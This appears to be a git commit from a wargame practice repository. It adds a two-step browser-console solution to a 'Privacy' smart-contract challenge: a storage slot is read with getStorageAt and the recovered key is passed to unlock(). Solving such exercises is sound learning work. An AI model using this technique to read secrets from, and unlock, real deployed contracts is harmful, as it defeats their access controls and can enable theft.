6ecdb1631b5057956ca369e1a54fcf9958b1d8c3
Filmptz <parichaya35@gmail.com>
2022-01-14 00:10:09 +0700

    Privacy - solved

---
+++ Privacy/privacy_solve.js
@@ -0,0 +1,11 @@
+/** solved on browser's console */
+
+/** 
+ * GET data[2] => bytes32
+*/
+await web3.eth.getStorageAt(instance,5)
+
+/** 
+ * Cast bytes32 to byres16
+*/
+await contract.unlock('0xdee6241b71b027f34cfe5a0410957a62') // data[2] in bytes32
